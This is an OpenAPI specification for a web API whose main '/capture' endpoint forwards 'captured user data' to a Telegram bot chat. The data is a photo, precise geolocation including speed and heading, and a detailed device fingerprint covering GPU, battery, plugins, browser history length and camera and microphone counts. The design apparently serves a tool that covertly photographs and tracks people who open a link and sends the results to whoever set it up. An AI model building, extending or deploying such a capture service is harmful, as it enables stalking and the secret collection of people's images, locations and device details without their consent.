openapi: 3.1.0
info:
  # Do not change the title, if the title changes, the import paths will be broken
  title: Api
  version: 0.1.0
  description: API specification
servers:
  - url: /api
    description: Base API path
tags:
  - name: health
    description: Health operations
  - name: capture
    description: User data capture operations
paths:
  /healthz:
    get:
      operationId: healthCheck
      tags: [health]
      summary: Health check
      responses:
        "200":
          description: Healthy
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/HealthStatus"
  /capture:
    post:
      operationId: submitCapture
      tags: [capture]
      summary: Submit captured user data to Telegram bot
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/CaptureData"
      responses:
        "200":
          description: Data sent successfully
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/CaptureResult"
        "400":
          description: Bad request
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/ErrorResponse"
        "500":
          description: Server error
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/ErrorResponse"
components:
  schemas:
    HealthStatus:
      type: object
      properties:
        status:
          type: string
      required:
        - status
    CaptureData:
      type: object
      required:
        - chatId
      properties:
        chatId:
          type: string
        photo:
          type: ["string", "null"]
        location:
          $ref: "#/components/schemas/LocationData"
        deviceInfo:
          $ref: "#/components/schemas/DeviceInfo"
    LocationData:
      type: object
      properties:
        latitude:
          type: ["number", "null"]
        longitude:
          type: ["number", "null"]
        accuracy:
          type: ["number", "null"]
        altitude:
          type: ["number", "null"]
        altitudeAccuracy:
          type: ["number", "null"]
        heading:
          type: ["number", "null"]
        speed:
          type: ["number", "null"]
        city:
          type: ["string", "null"]
    DeviceInfo:
      type: object
      properties:
        userAgent:
          type: string
        platform:
          type: string
        vendor:
          type: string
        language:
          type: string
        languages:
          type: array
          items:
            type: string
        timezone:
          type: string
        timezoneOffset:
          type: ["number", "null"]
        cookieEnabled:
          type: boolean
        doNotTrack:
          type: ["string", "null"]
        onLine:
          type: boolean
        hardwareConcurrency:
          type: ["number", "null"]
        deviceMemory:
          type: ["number", "null"]
        maxTouchPoints:
          type: ["number", "null"]
        screenWidth:
          type: number
        screenHeight:
          type: number
        screenAvailWidth:
          type: ["number", "null"]
        screenAvailHeight:
          type: ["number", "null"]
        colorDepth:
          type: ["number", "null"]
        pixelDepth:
          type: ["number", "null"]
        devicePixelRatio:
          type: ["number", "null"]
        innerWidth:
          type: ["number", "null"]
        innerHeight:
          type: ["number", "null"]
        orientationType:
          type: ["string", "null"]
        orientationAngle:
          type: ["number", "null"]
        battery:
          type: ["number", "null"]
        charging:
          type: ["boolean", "null"]
        chargingTime:
          type: ["number", "null"]
        dischargingTime:
          type: ["number", "null"]
        connectionType:
          type: ["string", "null"]
        connectionDownlink:
          type: ["number", "null"]
        connectionRtt:
          type: ["number", "null"]
        connectionSaveData:
          type: ["boolean", "null"]
        gpuRenderer:
          type: ["string", "null"]
        gpuVendor:
          type: ["string", "null"]
        webglSupported:
          type: ["boolean", "null"]
        webAssemblySupported:
          type: ["boolean", "null"]
        serviceWorkerSupported:
          type: ["boolean", "null"]
        notificationPermission:
          type: ["string", "null"]
        cameraCount:
          type: ["number", "null"]
        microphoneCount:
          type: ["number", "null"]
        pluginsCount:
          type: ["number", "null"]
        pluginsList:
          type: array
          items:
            type: string
        referrer:
          type: ["string", "null"]
        historyLength:
          type: ["number", "null"]
        pdfViewerEnabled:
          type: ["boolean", "null"]
        cookiesBlocked:
          type: ["boolean", "null"]
        localStorageEnabled:
          type: ["boolean", "null"]
        sessionStorageEnabled:
          type: ["boolean", "null"]
        indexedDbEnabled:
          type: ["boolean", "null"]
        adBlockEnabled:
          type: ["boolean", "null"]
    CaptureResult:
      type: object
      required:
        - success
        - message
      properties:
        success:
          type: boolean
        message:
          type: string
    ErrorResponse:
      type: object
      required:
        - error
      properties:
        error:
          type: string
